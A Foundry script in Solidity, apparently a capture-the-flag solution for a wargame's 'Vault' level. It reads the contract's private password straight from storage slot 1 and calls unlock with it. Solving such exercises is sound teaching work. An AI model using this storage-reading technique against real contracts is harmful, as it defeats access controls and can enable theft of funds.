// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {Vault} from "../src/level08/Vault.sol";

contract CallContractScript is Script {
    function run() external {
        // 指定私钥，可以从环境变量中获取，例如：process.env.PRIVATE_KEY
        uint256 privateKey = vm.envUint("PRIVATE_KEY");

        // 初始化一个签名者
        vm.startBroadcast(privateKey);

        Vault level = Vault(0x2a27021Aa2ccE6467cDc894E6394152fA8867fB4);

        bytes32 password = vm.load(address(level), bytes32(uint256(1)));
        
        level.unlock(password);

        vm.stopBroadcast();
    }
}
